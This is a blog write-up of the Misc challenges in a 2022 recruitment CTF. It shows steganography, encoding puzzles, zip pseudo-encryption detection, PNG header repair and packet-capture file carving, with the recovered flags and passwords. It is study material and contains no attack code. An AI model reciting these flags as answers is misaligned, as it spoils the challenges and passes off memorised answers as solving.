<!DOCTYPE html><html lang="en" data-theme="dark"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no"><title>2022弱口令实验室招新赛WriteUp | TTL战队 - Blogs</title><meta name="author" content="TTL"><meta name="copyright" content="TTL"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#0d0d0d"><meta name="description" content="Misc签到 下载附件，得到一张二维码。   扫码，然后根据提示“linux”操作系统，直接cat &#x2F;flag，得到flag。   EasyMisc 下载得到EasyMisc附件，压缩包中有flag.docx  Word打开，发现下方有个换行符。   不排除是字体设置白色前景色了，我们先看看能否选中。     发现选中是可以，但是没有内容。   更改字体颜色，得到此内容。 Ctrl+C好">
<meta property="og:type" content="article">
<meta property="og:title" content="2022弱口令实验室招新赛WriteUp">
<meta property="og:url" content="https://ttl-team.github.io/TTLs/59184.html">
<meta property="og:site_name" content="TTL战队 - Blogs">
<meta property="og:description" content="Misc签到 下载附件，得到一张二维码。   扫码，然后根据提示“linux”操作系统，直接cat &#x2F;flag，得到flag。   EasyMisc 下载得到EasyMisc附件，压缩包中有flag.docx  Word打开，发现下方有个换行符。   不排除是字体设置白色前景色了，我们先看看能否选中。     发现选中是可以，但是没有内容。   更改字体颜色，得到此内容。 Ctrl+C好">
<meta property="og:locale" content="en_US">
<meta property="og:image" content="http://ttl.easyctf.cn/img/2022%E5%BC%B1%E5%8F%A3%E4%BB%A4%E5%AE%9E%E9%AA%8C%E5%AE%A4%E6%8B%9B%E6%96%B0%E8%B5%9BWriteUp/image-20221114131157292.png">
<meta property="article:published_time" content="2022-11-14T04:41:18.000Z">
<meta property="article:modified_time" content="2022-11-19T13:40:53.412Z">
<meta property="article:author" content="TTL">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="http://ttl.easyctf.cn/img/2022%E5%BC%B1%E5%8F%A3%E4%BB%A4%E5%AE%9E%E9%AA%8C%E5%AE%A4%E6%8B%9B%E6%96%B0%E8%B5%9BWriteUp/image-20221114131157292.png"><link rel="shortcut icon" href="/img/favicon.png"><link rel="canonical" href="https://ttl-team.github.io/TTLs/59184"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = { 
  root: '/',
  algolia: undefined,
  localSearch: undefined,
  translate: undefined,
  noticeOutdate: undefined,
  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
  copy: {
    success: 'Copy successfully',
    error: 'Copy error',
    noSupport: 'The browser does not support'
  },
  relativeDate: {
    homepage: false,
    post: false
  },
  runtime: '',
  date_suffix: {
    just: 'Just',
    min: 'minutes ago',
    hour: 'hours ago',
    day: 'days ago',
    month: 'months ago'
  },
  copyright: undefined,
  lightbox: 'fancybox',
  Snackbar: undefined,
  source: {
    justifiedGallery: {
      js: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.js',
      css: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.css'
    }
  },
  isPhotoFigcaption: false,
  islazyload: false,
  isAnchor: false
}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
  title: '2022弱口令实验室招新赛WriteUp',
  isPost: true,
  isHome: false,
  isHighlightShrink: false,
  isToc: true,
  postUpdate: '2022-11-19 21:40:53'
}</script><noscript><style type="text/css">
  #nav {
    opacity: 1
  }
  .justified-gallery img {
    opacity: 1
  }

  #recent-posts time,
  #post-meta time {
    display: inline !important
  }
</style></noscript><script>(win=>{
    win.saveToLocal = {
      set: function setWithExpiry(key, value, ttl) {
        if (ttl === 0) return
        const now = new Date()
        const expiryDay = ttl * 86400000
        const item = {
          value: value,
          expiry: now.getTime() + expiryDay,
        }
        localStorage.setItem(key, JSON.stringify(item))
      },

      get: function getWithExpiry(key) {
        const itemStr = localStorage.getItem(key)

        if (!itemStr) {
          return undefined
        }
        const item = JSON.parse(itemStr)
        const now = new Date()

        if (now.getTime() > item.expiry) {
          localStorage.removeItem(key)
          return undefined
        }
        return item.value
      }
    }
  
    win.getScript = url => new Promise((resolve, reject) => {
      const script = document.createElement('script')
      script.src = url
      script.async = true
      script.onerror = reject
      script.onload = script.onreadystatechange = function() {
        const loadState = this.readyState
        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
        script.onload = script.onreadystatechange = null
        resolve()
      }
      document.head.appendChild(script)
    })
  
      win.activateDarkMode = function () {
        document.documentElement.setAttribute('data-theme', 'dark')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
        }
      }
      win.activateLightMode = function () {
        document.documentElement.setAttribute('data-theme', 'light')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
        }
      }
      const t = saveToLocal.get('theme')
    
          if (t === 'dark') activateDarkMode()
          else if (t === 'light') activateLightMode()
        
      const asideStatus = saveToLocal.get('aside-status')
      if (asideStatus !== undefined) {
        if (asideStatus === 'hide') {
          document.documentElement.classList.add('hide-aside')
        } else {
          document.documentElement.classList.remove('hide-aside')
        }
      }
    
    const detectApple = () => {
      if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
        document.documentElement.classList.add('apple')
      }
    }
    detectApple()
    })(window)</script><meta name="generator" content="Hexo 6.3.0"></head><body><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="/img/images/logo.png" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">Articles</div><div class="length-num">8</div></a><a href="/tags/"><div class="headline">Tags</div><div class="length-num">0</div></a><a href="/categories/"><div class="headline">Categories</div><div class="length-num">2</div></a></div><hr/></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('http://ttl.easyctf.cn/img/2022%E5%BC%B1%E5%8F%A3%E4%BB%A4%E5%AE%9E%E9%AA%8C%E5%AE%A4%E6%8B%9B%E6%96%B0%E8%B5%9BWriteUp/image-20221114131157292.png')"><nav id="nav"><span id="blog_name"><a id="site-name" href="/">TTL战队 - Blogs</a></span><div id="menus"><div id="toggle-menu"><a class="site-page"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">2022弱口令实验室招新赛WriteUp</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">Created</span><time class="post-meta-date-created" datetime="2022-11-14T04:41:18.000Z" title="Created 2022-11-14 12:41:18">2022-11-14</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">Updated</span><time class="post-meta-date-updated" datetime="2022-11-19T13:40:53.412Z" title="Updated 2022-11-19 21:40:53">2022-11-19</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/%E8%B5%9B%E4%BA%8BWP/">赛事WP</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="2022弱口令实验室招新赛WriteUp"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">Post View:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><h1 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h1><h2 id="签到"><a href="#签到" class="headerlink" title="签到"></a>签到</h2><p><img src="/./../img/2022%E5%BC%B1%E5%8F%A3%E4%BB%A4%E5%AE%9E%E9%AA%8C%E5%AE%A4%E6%8B%9B%E6%96%B0%E8%B5%9BWriteUp/image-20221114131157292.png"></p>
<p>下载附件，得到一张二维码。</p>
<img src="./../img/2022弱口令实验室招新赛WriteUp/image-20221114131216268.png" style="zoom: 50%;" />

<p>扫码，然后根据提示“linux”操作系统，直接cat &#x2F;flag，得到flag。</p>
<img src="./../img/2022弱口令实验室招新赛WriteUp/image-20221114131348042.png" style="zoom:33%;" />

<h2 id="EasyMisc"><a href="#EasyMisc" class="headerlink" title="EasyMisc"></a>EasyMisc</h2><p><img src="/./../img/2022%E5%BC%B1%E5%8F%A3%E4%BB%A4%E5%AE%9E%E9%AA%8C%E5%AE%A4%E6%8B%9B%E6%96%B0%E8%B5%9BWriteUp/image-20221114131606593.png"></p>
<p>下载得到EasyMisc附件，压缩包中有flag.docx</p>
<p><img src="/./../img/2022%E5%BC%B1%E5%8F%A3%E4%BB%A4%E5%AE%9E%E9%AA%8C%E5%AE%A4%E6%8B%9B%E6%96%B0%E8%B5%9BWriteUp/image-20221114131553058.png"></p>
<p>Word打开，发现下方有个换行符。</p>
<img src="./../img/2022弱口令实验室招新赛WriteUp/image-20221114131752258.png" style="zoom:67%;" />

<p>不排除是字体设置白色前景色了，我们先看看能否选中。</p>
<img src="./../img/2022弱口令实验室招新赛WriteUp/image-20221114131846826.png" style="zoom:67%;" />



<p>发现选中是可以，但是没有内容。</p>
<img src="./../img/2022弱口令实验室招新赛WriteUp/image-20221114131914242.png" style="zoom:67%;" />

<p>更改字体颜色，得到此内容。</p>
<p>Ctrl+C好像复制不出来，但是可以复制到微信的聊天框。</p>
<p>再次复制，进行base64解码。</p>
<img src="./../img/2022弱口令实验室招新赛WriteUp/image-20221114132031342.png" style="zoom: 67%;" />

<p>得到了504b 0304 0a00开头的一段16进制内容，应该是一个个压缩包，我们复制出来之后使用010Editor 导入16进制 并保存为文件。</p>
<p><img src="/./../img/2022%E5%BC%B1%E5%8F%A3%E4%BB%A4%E5%AE%9E%E9%AA%8C%E5%AE%A4%E6%8B%9B%E6%96%B0%E8%B5%9BWriteUp/image-20221114132307049.png"></p>
<p><img src="/./../img/2022%E5%BC%B1%E5%8F%A3%E4%BB%A4%E5%AE%9E%E9%AA%8C%E5%AE%A4%E6%8B%9B%E6%96%B0%E8%B5%9BWriteUp/image-20221114132355113.png"></p>
<p><img src="/./../img/2022%E5%BC%B1%E5%8F%A3%E4%BB%A4%E5%AE%9E%E9%AA%8C%E5%AE%A4%E6%8B%9B%E6%96%B0%E8%B5%9BWriteUp/image-20221114132403934.png"></p>
<p>接着就拿到了Flag。</p>
<h2 id="奇怪又不奇怪"><a href="#奇怪又不奇怪" class="headerlink" title="奇怪又不奇怪"></a>奇怪又不奇怪</h2><p>下载附件，拿到了一串奇奇怪怪的符号，总感觉很熟悉。</p>
<img src="./../img/2022弱口令实验室招新赛WriteUp/image-20221114133211486.png" style="zoom: 33%;" />

<img src="./../img/2022弱口令实验室招新赛WriteUp/image-20221114133344313.png" style="zoom:33%;" />

<p>在百度中找到了一篇这样的文章：<a target="_blank" rel="noopener" href="https://baijiahao.baidu.com/s?id=1748879623460661243&amp;wfr=spider&amp;for=pc">https://baijiahao.baidu.com/s?id=1748879623460661243&amp;wfr=spider&amp;for=pc</a></p>
<p><img src="/./../img/2022%E5%BC%B1%E5%8F%A3%E4%BB%A4%E5%AE%9E%E9%AA%8C%E5%AE%A4%E6%8B%9B%E6%96%B0%E8%B5%9BWriteUp/image-20221114133515706.png"></p>
<p>根据对照表的“须弥沙漠文”，得到FLAG MOXIAHJACK，那么flag就是qsnctf{MOXINAHJACK}</p>
<p><img src="/./../img/2022%E5%BC%B1%E5%8F%A3%E4%BB%A4%E5%AE%9E%E9%AA%8C%E5%AE%A4%E6%8B%9B%E6%96%B0%E8%B5%9BWriteUp/image-20221114133751103.png"></p>
<h2 id="做什么题啊来振刀啊"><a href="#做什么题啊来振刀啊" class="headerlink" title="做什么题啊来振刀啊"></a>做什么题啊来振刀啊</h2><p>说明：此题目来源于青少年CTF平台投稿。</p>
<p>下载附件，解压。</p>
<img src="./../img/2022弱口令实验室招新赛WriteUp/image-20221114134235552.png" style="zoom:50%;" />

<p>前面都是没用的东西迷惑人的，删掉。</p>
<img src="./../img/2022弱口令实验室招新赛WriteUp/image-20221114134647991.png" style="zoom:67%;" />

<p><img src="/./../img/2022%E5%BC%B1%E5%8F%A3%E4%BB%A4%E5%AE%9E%E9%AA%8C%E5%AE%A4%E6%8B%9B%E6%96%B0%E8%B5%9BWriteUp/image-20221114134709046.png"></p>
<p>删完之后还剩2722205行 因式分解 2305 x 1181 编写rgb转图片脚本</p>
<p><img src="/./../img/2022%E5%BC%B1%E5%8F%A3%E4%BB%A4%E5%AE%9E%E9%AA%8C%E5%AE%A4%E6%8B%9B%E6%96%B0%E8%B5%9BWriteUp/image-20221114134732794.png"></p>
<p>得到key2的密码和lsb密码</p>
<p><img src="/./../img/2022%E5%BC%B1%E5%8F%A3%E4%BB%A4%E5%AE%9E%E9%AA%8C%E5%AE%A4%E6%8B%9B%E6%96%B0%E8%B5%9BWriteUp/image-20221114134747623.png"></p>
<p><img src="/./../img/2022%E5%BC%B1%E5%8F%A3%E4%BB%A4%E5%AE%9E%E9%AA%8C%E5%AE%A4%E6%8B%9B%E6%96%B0%E8%B5%9BWriteUp/image-20221114134947713.png"></p>
<p>得到5进制</p>
<p><img src="/./../img/2022%E5%BC%B1%E5%8F%A3%E4%BB%A4%E5%AE%9E%E9%AA%8C%E5%AE%A4%E6%8B%9B%E6%96%B0%E8%B5%9BWriteUp/image-20221114135003060.png"></p>
<p>解密得到flag密码0unzre_1mxmWda</p>
<p><img src="/./../img/2022%E5%BC%B1%E5%8F%A3%E4%BB%A4%E5%AE%9E%E9%AA%8C%E5%AE%A4%E6%8B%9B%E6%96%B0%E8%B5%9BWriteUp/image-20221114135137604.png"></p>
<p>Flag.gif 抽帧拼图</p>
<p><img src="/./../img/2022%E5%BC%B1%E5%8F%A3%E4%BB%A4%E5%AE%9E%E9%AA%8C%E5%AE%A4%E6%8B%9B%E6%96%B0%E8%B5%9BWriteUp/image-20221114135148744.png"></p>
<p>用工具分解会有几张报错 剩下都手截就行了拼成后得到flag</p>
<p><img src="/./../img/2022%E5%BC%B1%E5%8F%A3%E4%BB%A4%E5%AE%9E%E9%AA%8C%E5%AE%A4%E6%8B%9B%E6%96%B0%E8%B5%9BWriteUp/image-20221114135205915.png"></p>
<h2 id="EasySo"><a href="#EasySo" class="headerlink" title="EasySo"></a>EasySo</h2><p>下载得到一张图片</p>
<p><img src="/./../img/2022%E5%BC%B1%E5%8F%A3%E4%BB%A4%E5%AE%9E%E9%AA%8C%E5%AE%A4%E6%8B%9B%E6%96%B0%E8%B5%9BWriteUp/image-20221114135425988.png"></p>
<p>颜色好像是相同的又好像是不相同的</p>
<p>图片是GIF，用Photoshop打开，<img src="/./../img/2022%E5%BC%B1%E5%8F%A3%E4%BB%A4%E5%AE%9E%E9%AA%8C%E5%AE%A4%E6%8B%9B%E6%96%B0%E8%B5%9BWriteUp/image-20221114140450110.png"></p>
<p>RGB的16进制吗，应该是十六进制编码。</p>
<p><img src="/./../img/2022%E5%BC%B1%E5%8F%A3%E4%BB%A4%E5%AE%9E%E9%AA%8C%E5%AE%A4%E6%8B%9B%E6%96%B0%E8%B5%9BWriteUp/image-20221114141003672.png"></p>
<p>得到flag为：qsnctf{aapjes}</p>
<h2 id="ScanQR"><a href="#ScanQR" class="headerlink" title="ScanQR"></a>ScanQR</h2><p><img src="/./../img/2022%E5%BC%B1%E5%8F%A3%E4%BB%A4%E5%AE%9E%E9%AA%8C%E5%AE%A4%E6%8B%9B%E6%96%B0%E8%B5%9BWriteUp/image-20221114141813405.png"></p>
<p><img src="/./../img/2022%E5%BC%B1%E5%8F%A3%E4%BB%A4%E5%AE%9E%E9%AA%8C%E5%AE%A4%E6%8B%9B%E6%96%B0%E8%B5%9BWriteUp/image-20221114142354943.png"></p>
<p>得到了一张类似于二维码的东西</p>
<p><img src="/./../img/2022%E5%BC%B1%E5%8F%A3%E4%BB%A4%E5%AE%9E%E9%AA%8C%E5%AE%A4%E6%8B%9B%E6%96%B0%E8%B5%9BWriteUp/image-20221114144153033.png"></p>
<p>使用“中国编码”APP扫描得到一串乱码的东西，估计是汉信码的编码和制作时的内容不同。</p>
<p><a target="_blank" rel="noopener" href="https://pan.baidu.com/s/17RzBbdSQqCTxAE66on9cOA?pwd=20p6">https://pan.baidu.com/s/17RzBbdSQqCTxAE66on9cOA?pwd=20p6</a></p>
<p><img src="/./../img/2022%E5%BC%B1%E5%8F%A3%E4%BB%A4%E5%AE%9E%E9%AA%8C%E5%AE%A4%E6%8B%9B%E6%96%B0%E8%B5%9BWriteUp/image-20221114144422164.png"></p>
<p>百度网盘打开，下载。</p>
<p><img src="/./../img/2022%E5%BC%B1%E5%8F%A3%E4%BB%A4%E5%AE%9E%E9%AA%8C%E5%AE%A4%E6%8B%9B%E6%96%B0%E8%B5%9BWriteUp/image-20221114150431788.png"></p>
<p>看似杂乱无章</p>
<p>实则暗藏玄机</p>
<p>根据经验可知</p>
<p>这肯定，又是16进制…</p>
<p><img src="/./../img/2022%E5%BC%B1%E5%8F%A3%E4%BB%A4%E5%AE%9E%E9%AA%8C%E5%AE%A4%E6%8B%9B%E6%96%B0%E8%B5%9BWriteUp/image-20221114150505547.png"></p>
<p>解码得到16进制内容，复制出来，继续用010Editor</p>
<p><img src="/./../img/2022%E5%BC%B1%E5%8F%A3%E4%BB%A4%E5%AE%9E%E9%AA%8C%E5%AE%A4%E6%8B%9B%E6%96%B0%E8%B5%9BWriteUp/image-20221114150548179.png"></p>
<p>242行，有点东西。</p>
<p>导入16进制</p>
<p><img src="/./../img/2022%E5%BC%B1%E5%8F%A3%E4%BB%A4%E5%AE%9E%E9%AA%8C%E5%AE%A4%E6%8B%9B%E6%96%B0%E8%B5%9BWriteUp/image-20221114150855659.png"></p>
<p>一个PNG文件</p>
<p><img src="/./../img/2022%E5%BC%B1%E5%8F%A3%E4%BB%A4%E5%AE%9E%E9%AA%8C%E5%AE%A4%E6%8B%9B%E6%96%B0%E8%B5%9BWriteUp/image-20221114150957392.png"></p>
<p>得到一张二维码图片，定位点补齐即可。</p>
<p><img src="/./../img/2022%E5%BC%B1%E5%8F%A3%E4%BB%A4%E5%AE%9E%E9%AA%8C%E5%AE%A4%E6%8B%9B%E6%96%B0%E8%B5%9BWriteUp/image-20221114151305812.png"></p>
<p>补齐之后，扫描，得到flag</p>
<p><img src="/./../img/2022%E5%BC%B1%E5%8F%A3%E4%BB%A4%E5%AE%9E%E9%AA%8C%E5%AE%A4%E6%8B%9B%E6%96%B0%E8%B5%9BWriteUp/image-20221114151401120.png"></p>
<h2 id="Cookie怎么分"><a href="#Cookie怎么分" class="headerlink" title="Cookie怎么分"></a>Cookie怎么分</h2><p><img src="/./../img/2022%E5%BC%B1%E5%8F%A3%E4%BB%A4%E5%AE%9E%E9%AA%8C%E5%AE%A4%E6%8B%9B%E6%96%B0%E8%B5%9BWriteUp/image-20221114155531672.png"></p>
<p>下载附件</p>
<p><img src="/./../img/2022%E5%BC%B1%E5%8F%A3%E4%BB%A4%E5%AE%9E%E9%AA%8C%E5%AE%A4%E6%8B%9B%E6%96%B0%E8%B5%9BWriteUp/image-20221114155607909.png"></p>
<p>得到一个流量包，压缩前156.9MB，这个文件里绝对不简单。</p>
<p><img src="/./../img/2022%E5%BC%B1%E5%8F%A3%E4%BB%A4%E5%AE%9E%E9%AA%8C%E5%AE%A4%E6%8B%9B%E6%96%B0%E8%B5%9BWriteUp/image-20221114155728101.png"></p>
<p>毫无软用的信息</p>
<p><img src="/./../img/2022%E5%BC%B1%E5%8F%A3%E4%BB%A4%E5%AE%9E%E9%AA%8C%E5%AE%A4%E6%8B%9B%E6%96%B0%E8%B5%9BWriteUp/image-20221114155757445.png"></p>
<p>并且填充了0000空数据</p>
<p><img src="/./../img/2022%E5%BC%B1%E5%8F%A3%E4%BB%A4%E5%AE%9E%E9%AA%8C%E5%AE%A4%E6%8B%9B%E6%96%B0%E8%B5%9BWriteUp/image-20221114160114324.png"></p>
<p>最后面还有一个jpg图片</p>
<p><img src="/./../img/2022%E5%BC%B1%E5%8F%A3%E4%BB%A4%E5%AE%9E%E9%AA%8C%E5%AE%A4%E6%8B%9B%E6%96%B0%E8%B5%9BWriteUp/image-20221114172257116.png"></p>
<p>文件大小不对，可能是因为垃圾数据填充导致的。</p>
<p><img src="/./../img/2022%E5%BC%B1%E5%8F%A3%E4%BB%A4%E5%AE%9E%E9%AA%8C%E5%AE%A4%E6%8B%9B%E6%96%B0%E8%B5%9BWriteUp/image-20221114172913710.png"></p>
<p>在流量包中找到一串Base64：</p>
<p><code>http://192.168.31.158/index.php?flag=cXNuY3Rme2I1NTEyOTQ2LWQ3YWMt</code></p>
<p><img src="/./../img/2022%E5%BC%B1%E5%8F%A3%E4%BB%A4%E5%AE%9E%E9%AA%8C%E5%AE%A4%E6%8B%9B%E6%96%B0%E8%B5%9BWriteUp/image-20221114173050217.png"></p>
<p>得到了一段Flag的前半段 </p>
<p>qsnctf{b5512946-d7ac-</p>
<p><img src="/./../img/2022%E5%BC%B1%E5%8F%A3%E4%BB%A4%E5%AE%9E%E9%AA%8C%E5%AE%A4%E6%8B%9B%E6%96%B0%E8%B5%9BWriteUp/image-20221114185336063.png"></p>
<p>foremost跑一下，看看能不能遇到爱。</p>
<p><img src="/./../img/2022%E5%BC%B1%E5%8F%A3%E4%BB%A4%E5%AE%9E%E9%AA%8C%E5%AE%A4%E6%8B%9B%E6%96%B0%E8%B5%9BWriteUp/image-20221114185532957.png"></p>
<p>有文件析出</p>
<p><img src="/./../img/2022%E5%BC%B1%E5%8F%A3%E4%BB%A4%E5%AE%9E%E9%AA%8C%E5%AE%A4%E6%8B%9B%E6%96%B0%E8%B5%9BWriteUp/image-20221114185603412.png"></p>
<p>可以由此看出，这应该是一个Python的HTTP Server模块，然后流量包里的大部分内容都是在这里的。</p>
<p><img src="/./../img/2022%E5%BC%B1%E5%8F%A3%E4%BB%A4%E5%AE%9E%E9%AA%8C%E5%AE%A4%E6%8B%9B%E6%96%B0%E8%B5%9BWriteUp/image-20221114185803792.png"></p>
<p>也拿到了很多的jpg图像，大小不一，但是foremost已经帮我们找到了其中的压缩包。</p>
<p><img src="/./../img/2022%E5%BC%B1%E5%8F%A3%E4%BB%A4%E5%AE%9E%E9%AA%8C%E5%AE%A4%E6%8B%9B%E6%96%B0%E8%B5%9BWriteUp/image-20221114185948809.png"></p>
<p>第一个压缩包打开出错，我们看第二个，依然出错。</p>
<p>怀疑是工具问题，使用Wireshark导出对象。</p>
<p><img src="/./../img/2022%E5%BC%B1%E5%8F%A3%E4%BB%A4%E5%AE%9E%E9%AA%8C%E5%AE%A4%E6%8B%9B%E6%96%B0%E8%B5%9BWriteUp/image-20221114191307590.png"></p>
<p><img src="/./../img/2022%E5%BC%B1%E5%8F%A3%E4%BB%A4%E5%AE%9E%E9%AA%8C%E5%AE%A4%E6%8B%9B%E6%96%B0%E8%B5%9BWriteUp/image-20221114191330307.png"></p>
<p>使用binwalk分离图片内容</p>
<p>得到压缩包</p>
<p>再分离别的图片</p>
<p><img src="/./../img/2022%E5%BC%B1%E5%8F%A3%E4%BB%A4%E5%AE%9E%E9%AA%8C%E5%AE%A4%E6%8B%9B%E6%96%B0%E8%B5%9BWriteUp/image-20221114191554898.png"></p>
<p>除了最大的Cookie图片，其他两个小的Cookie都出来了压缩包。</p>
<p><img src="/./../img/2022%E5%BC%B1%E5%8F%A3%E4%BB%A4%E5%AE%9E%E9%AA%8C%E5%AE%A4%E6%8B%9B%E6%96%B0%E8%B5%9BWriteUp/image-20221114191726813.png"></p>
<p>得到两个txt</p>
<p><img src="/./../img/2022%E5%BC%B1%E5%8F%A3%E4%BB%A4%E5%AE%9E%E9%AA%8C%E5%AE%A4%E6%8B%9B%E6%96%B0%E8%B5%9BWriteUp/image-20221114191742197.png"></p>
<p>两个txt都有16进制的数据，直接使用010Editor保存为文件。</p>
<p><img src="/./../img/2022%E5%BC%B1%E5%8F%A3%E4%BB%A4%E5%AE%9E%E9%AA%8C%E5%AE%A4%E6%8B%9B%E6%96%B0%E8%B5%9BWriteUp/image-20221114191933959.png"></p>
<p>打开压缩包，都提示要密码，先看看是不是伪加密。</p>
<p><img src="/./../img/2022%E5%BC%B1%E5%8F%A3%E4%BB%A4%E5%AE%9E%E9%AA%8C%E5%AE%A4%E6%8B%9B%E6%96%B0%E8%B5%9BWriteUp/image-20221114192230809.png"></p>
<p><img src="/./../img/2022%E5%BC%B1%E5%8F%A3%E4%BB%A4%E5%AE%9E%E9%AA%8C%E5%AE%A4%E6%8B%9B%E6%96%B0%E8%B5%9BWriteUp/image-20221114192248712.png"></p>
<p>base_00是伪加密</p>
<p>base_11是真加密</p>
<p><img src="/./../img/2022%E5%BC%B1%E5%8F%A3%E4%BB%A4%E5%AE%9E%E9%AA%8C%E5%AE%A4%E6%8B%9B%E6%96%B0%E8%B5%9BWriteUp/image-20221114192542638.png"></p>
<p>得到密码20221108</p>
<p><img src="/./../img/2022%E5%BC%B1%E5%8F%A3%E4%BB%A4%E5%AE%9E%E9%AA%8C%E5%AE%A4%E6%8B%9B%E6%96%B0%E8%B5%9BWriteUp/image-20221114192718997.png"></p>
<p>base_0有个CRC问题，应该是图片高度或者宽度被修改了</p>
<p>base_0和base_1的高度宽度应该都是一样的，因为是等分图片。</p>
<p><img src="/./../img/2022%E5%BC%B1%E5%8F%A3%E4%BB%A4%E5%AE%9E%E9%AA%8C%E5%AE%A4%E6%8B%9B%E6%96%B0%E8%B5%9BWriteUp/image-20221114193131965.png"></p>
<p>bsae_0的高度位是01 BB</p>
<p>base_1的是01 FB</p>
<p><img src="/./../img/2022%E5%BC%B1%E5%8F%A3%E4%BB%A4%E5%AE%9E%E9%AA%8C%E5%AE%A4%E6%8B%9B%E6%96%B0%E8%B5%9BWriteUp/image-20221114193158734.png"></p>
<p>修改base_0的高度为01 FB 保存</p>
<p><img src="/./../img/2022%E5%BC%B1%E5%8F%A3%E4%BB%A4%E5%AE%9E%E9%AA%8C%E5%AE%A4%E6%8B%9B%E6%96%B0%E8%B5%9BWriteUp/image-20221114193239891.png"></p>
<p>得到了完整的图片</p>
<p><img src="/./../img/2022%E5%BC%B1%E5%8F%A3%E4%BB%A4%E5%AE%9E%E9%AA%8C%E5%AE%A4%E6%8B%9B%E6%96%B0%E8%B5%9BWriteUp/image-20221114193320949.png"></p>
<p>接着在Photoshop中创建一个高度为507，宽度为829+829的图片。</p>
<p><img src="/./../img/2022%E5%BC%B1%E5%8F%A3%E4%BB%A4%E5%AE%9E%E9%AA%8C%E5%AE%A4%E6%8B%9B%E6%96%B0%E8%B5%9BWriteUp/image-20221114193438101.png"></p>
<p><img src="/./../img/2022%E5%BC%B1%E5%8F%A3%E4%BB%A4%E5%AE%9E%E9%AA%8C%E5%AE%A4%E6%8B%9B%E6%96%B0%E8%B5%9BWriteUp/image-20221114193606789.png"></p>
<p>底图宽度有些不够，小失误，调整一下画布大小</p>
<p><img src="/./../img/2022%E5%BC%B1%E5%8F%A3%E4%BB%A4%E5%AE%9E%E9%AA%8C%E5%AE%A4%E6%8B%9B%E6%96%B0%E8%B5%9BWriteUp/image-20221114193702127.png" alt="image-20221114193702127"></p>
<p>我这里调整了2440，明显过宽了，不过咱们可以裁剪。</p>
<p>使用orc脚本（也可以用微信，新版本电脑微信嗷嗷好用，不过需要截取一小段一小段识别），读取内容</p>
<p><img src="/./../img/2022%E5%BC%B1%E5%8F%A3%E4%BB%A4%E5%AE%9E%E9%AA%8C%E5%AE%A4%E6%8B%9B%E6%96%B0%E8%B5%9BWriteUp/image-20221114200015810.png"></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> pytesseract</span><br><span class="line"></span><br><span class="line">file_path = <span class="string">&quot;test.png&quot;</span></span><br><span class="line"></span><br><span class="line">text=pytesseract.image_to_string(Image.<span class="built_in">open</span>(file_path),lang=<span class="string">&#x27;chi_sim&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(text)</span><br></pre></td></tr></table></figure>

<p><img src="/./../img/2022%E5%BC%B1%E5%8F%A3%E4%BB%A4%E5%AE%9E%E9%AA%8C%E5%AE%A4%E6%8B%9B%E6%96%B0%E8%B5%9BWriteUp/image-20221114194814151.png"></p>
<p>保存到txt中，然后挑前面一些进行解码</p>
<p><img src="/./../img/2022%E5%BC%B1%E5%8F%A3%E4%BB%A4%E5%AE%9E%E9%AA%8C%E5%AE%A4%E6%8B%9B%E6%96%B0%E8%B5%9BWriteUp/image-20221114194857021.png"></p>
<p>得到了PNG的文件头。</p>
<p>Base64转文件</p>
<p><img src="/./../img/2022%E5%BC%B1%E5%8F%A3%E4%BB%A4%E5%AE%9E%E9%AA%8C%E5%AE%A4%E6%8B%9B%E6%96%B0%E8%B5%9BWriteUp/image-20221114194949771-1668426590128-1.png"></p>
